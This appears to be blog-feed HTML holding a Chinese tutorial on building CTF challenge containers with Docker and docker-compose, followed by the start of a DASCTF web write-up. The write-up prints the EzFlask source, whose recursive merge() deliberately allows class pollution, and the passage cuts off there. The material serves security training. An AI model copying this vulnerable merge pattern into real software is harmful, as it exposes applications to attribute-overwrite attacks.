class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name 给docker取个名 -p 想开放的端口:80 服务器镜像名</span></span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name dockername1 -p 180:80 tutum/lamp</span></span><br><span class="line">//创建tutum/lamp服务器，命名为dockername1，开放<span class="number">180</span>端口供访问</span><br></pre></td></tr></table></figure><p><strong>4.普通题目复制</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">把文件拉到linux目录下</span><br><span class="line">docker cp 文件名 docker名<span class="symbol">:/var/www/html</span>   </span><br><span class="line">/<span class="regexp">/把文件复制到docker的/var</span><span class="regexp">/www/html</span>目录下，记得命名一个index.php，文件的其他人权限得设置成可读</span><br></pre></td></tr></table></figure><p><strong>5.（可有可无）进入docker查看</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker名 <span class="regexp">/bin/</span>bash  </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>进入之后就随便命令执行就好了，没问题就访问宿主机ip+端口看看，能访问就没问题</span><br></pre></td></tr></table></figure><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p><strong>查看docker容器状态</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">ps</span>  </span><br><span class="line">docker <span class="built_in">ps</span> <span class="literal">-a</span></span><br></pre></td></tr></table></figure><p><strong>查看docker镜像状态</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><strong>新建docker容器</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span> -id --name 起个名 -p 开放端口:映射端口 tutum/lamp</span><br><span class="line"><span class="meta">#映射端口前首先确定端口没有被占用</span></span><br><span class="line"><span class="meta">#-d <span class="comment">//容器后台运行。</span></span></span><br><span class="line"><span class="meta">#-p <span class="comment">//指定映射端口。</span></span></span><br><span class="line"><span class="meta">#-P <span class="comment">//随机映射高端口</span></span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9999</span>:<span class="number">80</span> tutum/lamp</span><br></pre></td></tr></table></figure><p><strong>复制文件进入docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp [本地路径] [container id]<span class="symbol">:</span>[container 路径]</span><br><span class="line">例如:</span><br><span class="line">docker cp flag.php docker名字<span class="symbol">:/var/www/html</span></span><br></pre></td></tr></table></figure><p><strong>查询宿主机ip</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><strong>进入指定docker</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it docker名字 <span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="meta">#如果从这个容器退出，不会导致容器的停止，推荐使用 docker exec</span></span><br><span class="line"><span class="meta">#-i <span class="comment">//让容器的标准输入保持打开。</span></span></span><br><span class="line"><span class="meta">#-t <span class="comment">//让docker分配一个伪终端并绑定到容器的标准输出上。</span></span></span><br></pre></td></tr></table></figure><p><strong>退出当前docker容器</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">docker</span> ex<span class="keyword">port</span> [dockerID] &gt; Find.tar</span><br></pre></td></tr></table></figure><p><strong>启动容器</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> 容器ID</span><br></pre></td></tr></table></figure><p><strong>查看所有存在的容器</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> <span class="keyword">ls</span> -a</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [<span class="built_in">container</span> id]或者是[<span class="built_in">container</span> name]</span><br><span class="line"><span class="meta">#需要先把容器停掉</span></span><br></pre></td></tr></table></figure><h2 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍"></a>模板介绍</h2><p>十分感谢nss的师傅提供的模板啦，这里附上链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CTF-Archives/</span>ctf-docker-template</span><br></pre></td></tr></table></figure><h2 id="利用dockerfile和docker-compose出题"><a href="#利用dockerfile和docker-compose出题" class="headerlink" title="利用dockerfile和docker-compose出题"></a>利用dockerfile和docker-compose出题</h2><p>这里感谢f12大佬提供的帮助</p><h3 id="这俩东西是什么？"><a href="#这俩东西是什么？" class="headerlink" title="这俩东西是什么？"></a>这俩东西是什么？</h3><p>在此之前，我们先来明确两个个概念;</p><p>（1）镜像：<br>什么是镜像？当我们在虚拟机启动docker后，运行docker images，我们所看到的就是我们docker里所拥有的镜像</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/eb83d995c2a91cec54d44f0f93191b9.png" alt=""></p><p>上面的五列依次是 镜像名称  镜像标签  镜像id  镜像创建时间  镜像大小</p><p>（2）容器：</p><p>镜像是用来干什么的呢？当然是创建容器啦，当我们输入docker ps(查看在运行的容器)或者docker ps -a(查看所有容器)就可以看到容器</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b0e20b86ca59ba33927055323c6f6c1.png" alt=""></p><p>了解了这些基础，我们就可以继续下面的内容了</p><h4 id="先介绍dockerfile"><a href="#先介绍dockerfile" class="headerlink" title="先介绍dockerfile:"></a><strong>先介绍dockerfile:</strong></h4><p>dockerfile将一些需要执行的命令存储在这个文件中,在需要的时候自动执行。我们应该如何使用这个文件捏？这个时候就要提到docker builid这个指令了，使用格式如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="tag">&lt;<span class="name">镜像名称</span>&gt;</span>:<span class="tag">&lt;<span class="name">镜像标签</span>&gt;</span> <span class="tag">&lt;<span class="name">上下文路径</span>&gt;</span></span><br><span class="line">例如：</span><br><span class="line">docker build -t sql:v1 .</span><br><span class="line">这里的.是当前目录的意思，这主要是给docker一个引用路径，告诉docker你需要的文件都在当前目录以及其子目录下</span><br></pre></td></tr></table></figure><p>通常情况下，该命令会自动搜索.及其子目录下的名为dockerfile的文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f 路径</span></span><br><span class="line">此方法可以指定文件作为dockerfile使用</span><br></pre></td></tr></table></figure><p>参考博客：<a href="https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187</a></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/17c52f8981f341a48dc82ab82918461e.png" alt=""></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b370884a35ec495dbe708fd704598e9b.png" alt=""></p><p><strong>对于以下代码的理解可以参考NSS的模板web-nginx-mysql-php73，附上截图</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727231741.png" alt=""></p><h5 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h5><p>指定基础镜像，必须为第一个命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span></span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span>:<span class="symbol">&lt;tag&gt;</span></span><br><span class="line">　　FROM <span class="symbol">&lt;image&gt;</span>@<span class="symbol">&lt;digest&gt;</span></span><br><span class="line"></span><br><span class="line">示例：　　</span><br><span class="line">FROM mysq<span class="variable">l:5</span>.<span class="number">6</span></span><br><span class="line">注：</span><br><span class="line">   <span class="keyword">tag</span>或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><h5 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h5><p>构建镜像时执行的命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span>用于在构建镜像时执行命令，其有以下两种命令执行方式：</span><br><span class="line"><span class="keyword">shell</span>执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span> &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">格式：</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">    <span class="keyword">RUN</span> apk <span class="keyword">update</span></span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">注：<span class="keyword">RUN</span>指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，</span><br><span class="line">可以在构建时指定--<span class="keyword">no</span>-cache参数，如：docker build --<span class="keyword">no</span>-cache</span><br></pre></td></tr></table></figure><h5 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h5><p>将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="built_in">ADD</span> &lt;src&gt;<span class="built_in">..</span>. &lt;dest&gt;</span><br><span class="line">    <span class="built_in">ADD</span> [<span class="string">&quot;&lt;src&gt;&quot;</span>,<span class="built_in">..</span>. <span class="string">&quot;&lt;dest&gt;&quot;</span>] 用于支持包含空格的路径</span><br><span class="line">示例：</span><br><span class="line">    <span class="built_in">ADD</span> hom* /mydir/          # 添加所有以<span class="string">&quot;hom&quot;</span>开头的文件</span><br><span class="line">    <span class="built_in">ADD</span> hom?.txt /mydir/      # ? 替代一个单字符,例如：<span class="string">&quot;home.txt&quot;</span></span><br><span class="line">    <span class="built_in">ADD</span> test relativeDir/     # 添加 <span class="string">&quot;test&quot;</span> 到 `WORKDIR`/relativeDir/</span><br><span class="line">    <span class="built_in">ADD</span> test /absoluteDir/    # 添加 <span class="string">&quot;test&quot;</span> 到 /absoluteDir/</span><br></pre></td></tr></table></figure><h5 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h5><p>功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">格式：</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (执行可执行文件，优先)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">command</span> param1 param2 (执行shell内部命令)</span></span><br><span class="line">示例：</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">注：<span class="keyword">CMD</span><span class="language-bash">不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose:"></a><strong>docker-compose:</strong></h4><p>docker-compse像是一个中控系统，他可以控制由他启动的所有容器，同时启动、同时关闭、同时删除等，命名一般为xxxxx.yaml，内容格式如下，以NSS模板web-nginx-mysql-php73为例</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727224529.png" alt=""></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重点关注services部分，缩进一次的web和www为镜像名，缩进两次的为容器参数，例如开放端口、映射端口、容器名、启动的dockerfile位置（<span class="keyword">build</span>参数），这样可以实现同时启动多个不同容器。</span><br></pre></td></tr></table></figure><p><strong>启动命令</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在该目录下执行</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose -f docker-compose.yml up -d   <span class="regexp">//</span>指定目录</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230728133207.png" alt=""></p><p>这里就可以清楚的看到，我们执行docker-compose up -d后，启动了name4和name5这两个容器，然后构建了docker_www和docker_web这两个服务器镜像，此处的镜像是可以通过上述run命令二次使用的，注意docker-compose只能管理由docker-compose所启动的容器，而run启动的是不可以控制的。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-compose restart   <span class="regexp">//</span>重启服务容器。</span><br><span class="line">docker-compose start     <span class="regexp">//</span>启动服务容器。</span><br><span class="line">docker-compose stop      <span class="regexp">//</span>停止服务容器。</span><br><span class="line">docker-compose rm        <span class="regexp">//</span>删除服务（停止状态）容器。</span><br><span class="line">docker-compose down      <span class="regexp">//</span>停止并删除所有服务的容器、网络、镜像、数据卷。</span><br><span class="line">docker-compose images    <span class="regexp">//</span>打印服务容器所对应的镜像。</span><br></pre></td></tr></table></figure><h4 id="出题建议-web-nginx-mysql-php73"><a href="#出题建议-web-nginx-mysql-php73" class="headerlink" title="出题建议(web-nginx-mysql-php73)"></a>出题建议(web-nginx-mysql-php73)</h4><h5 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a><strong>基本框架</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker</span><br><span class="line">│   └── docker-compose<span class="selector-class">.yml</span></span><br><span class="line">├── Dockerfile</span><br><span class="line">├── db<span class="selector-class">.sql</span></span><br><span class="line">├── service</span><br><span class="line">│   └── docker-entrypoint<span class="selector-class">.sh</span></span><br><span class="line">└── <span class="attribute">src</span></span><br><span class="line">├── shell<span class="selector-class">.php</span></span><br><span class="line">├── index<span class="selector-class">.php</span></span><br><span class="line">├── flag<span class="selector-class">.php</span></span><br><span class="line">├── connect<span class="selector-class">.php</span></span><br><span class="line">├── source</span><br><span class="line">└── assets</span><br><span class="line">└── bootstrap</span><br><span class="line">├── css</span><br><span class="line">└── js</span><br></pre></td></tr></table></figure><p>附上大佬的讲解视频，非常详细</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1xW4y1Z7aa/?spm_id_from=<span class="number">333.999</span>.<span class="number">0.0</span>&amp;vd_source=<span class="number">757</span>ded406aff262d5f6010cb1a347a9a</span><br></pre></td></tr></table></figure><p>题目框架已经是非常完整的了，只需要按照自己的需求稍加修改就可以轻松出题啦！</p><h5 id="删除部分"><a href="#删除部分" class="headerlink" title="删除部分"></a><strong>删除部分</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="selector-class">.php</span></span><br><span class="line">flag<span class="selector-class">.php</span></span><br><span class="line">docker-compose.yml中的环境变量设置</span><br><span class="line"></span><br><span class="line">以上部分为测试用途，没用一定得删，防止出现非预期解</span><br></pre></td></tr></table></figure><h5 id="修改部分"><a href="#修改部分" class="headerlink" title="修改部分"></a><strong>修改部分</strong></h5><p>（1）：connect.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要用于数据库连接，其中的参数可以进行修改，但一定注意要和dockerfile中的参数值保持一致，二者必须同时修改</span><br></pre></td></tr></table></figure><p>（2）：index.php、docker-entrypoint.sh、docker-compose.yaml</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这三者主要是用于个性化的修改：</span><br><span class="line"></span><br><span class="line"><span class="keyword">index</span>.php不必多说，主要是完善你自己想出的<span class="keyword">sql</span>语句以及过滤等</span><br><span class="line"></span><br><span class="line">docker-entrypoint.sh 里面有两种flag的生成格式，可以根据自己的需要进行修改</span><br><span class="line"></span><br><span class="line">docker-compose.yaml 可以调整开启的端口以及环境变量等因素</span><br></pre></td></tr></table></figure><p>（3）：Dockerfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据上述介绍，将自己所需要执行的操作写入dockerfile，不放心的话可以自己本地测试一下</span><br></pre></td></tr></table></figure><p><strong>启动</strong></p><p>完成上述操作后就可以启动容器啦，方法有2：</p><p>（1）：如果只有一个容器，可以直接在你的dockerfile目录使用docker build命令进行创建</p><p>（2）：如果有多个容器需要用到compose，那么可以在.yaml目录中执行docker-compose up -d</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 出题教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF WEB WP</title>
      <link href="/posts/54ff006d.html"/>
      <url>/posts/54ff006d.html</url>
      
        <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span 